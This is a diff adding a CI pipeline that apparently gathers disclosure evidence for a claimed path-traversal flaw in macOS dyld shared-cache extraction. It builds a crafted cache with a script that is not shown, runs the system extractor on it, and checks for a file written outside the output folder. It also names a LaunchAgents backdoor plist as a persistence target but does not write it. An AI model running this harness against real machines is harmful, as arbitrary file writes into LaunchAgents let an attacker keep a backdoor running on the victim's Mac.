@@ -1,0 +1,70 @@
+stages:
+  - poc
+
+# ── DSC-EXTRACTOR-TRAVERSAL-1 — Gate A/B/D Evidence ──────────────────────────
+# CWE-22 Path Traversal in dyld dsc_extractor.cpp
+# Attacker-controlled install name (pathFileOffset) fed to strcat() without
+# sanitization → arbitrary file write outside the extraction directory.
+# ─────────────────────────────────────────────────────────────────────────────
+
+dsc_traversal_poc:
+  stage: poc
+  tags:
+    - macos
+    - saas-macos-medium-m1
+  script:
+    - |
+      echo "=== GATE A: Hardware / OS identity ==="
+      sw_vers
+      uname -m
+      system_profiler SPHardwareDataType | grep -E "Model|Processor|Chip"
+
+      echo ""
+      echo "=== Building malicious dyld shared cache ==="
+      python3 gen_malicious_dsc.py malicious_ci.cache
+      sha256sum malicious_ci.cache || shasum -a 256 malicious_ci.cache
+
+      echo ""
+      echo "=== GATE A: Running PoC ==="
+      OUTDIR="$(mktemp -d /tmp/dsc_poc_out_XXXXXX)"
+      echo "Extraction directory: $OUTDIR"
+
+      # Run extraction — may print errors to stderr; we capture all output
+      /usr/bin/dyld_shared_cache_util -extract malicious_ci.cache "$OUTDIR" 2>&1 || true
+
+      echo ""
+      echo "=== GATE A: Checking traversal target ==="
+      TRAVERSAL_TARGET="/tmp/poc_dsc_traversal_proof"
+      if [ -e "$TRAVERSAL_TARGET" ]; then
+        echo "TRAVERSAL CONFIRMED: File exists outside extraction directory"
+        ls -la "$TRAVERSAL_TARGET"
+        echo "--- file(1) ---"
+        file "$TRAVERSAL_TARGET"
+        echo "--- xxd (first 256 bytes) ---"
+        xxd "$TRAVERSAL_TARGET" | head -16
+        echo "--- Extraction dir contents (should NOT contain the file) ---"
+        ls -la "$OUTDIR" || true
+      else
+        echo "TRAVERSAL NOT TRIGGERED — check stderr above for diagnostics"
+        echo "Extraction dir contents:"
+        find "$OUTDIR" -ls 2>/dev/null || true
+      fi
+
+      echo ""
+      echo "=== GATE B: High-impact path traversal (LaunchAgents persistence) ==="
+      HOME_LAUNCH="$HOME/Library/LaunchAgents"
+      echo "Would write to: $HOME_LAUNCH/com.evil.backdoor.plist"
+      echo "(Skipping actual write to avoid side-effects on CI runner)"
+
+      echo ""
+      echo "=== GATE D: Archive integrity ==="
+      shasum -a 256 gen_malicious_dsc.py malicious_ci.cache
+
+      echo ""
+      echo "=== END OF PoC ==="
+  artifacts:
+    when: always
+    paths:
+      - malicious_ci.cache
+      - gen_malicious_dsc.py
+    expire_in: 30 days
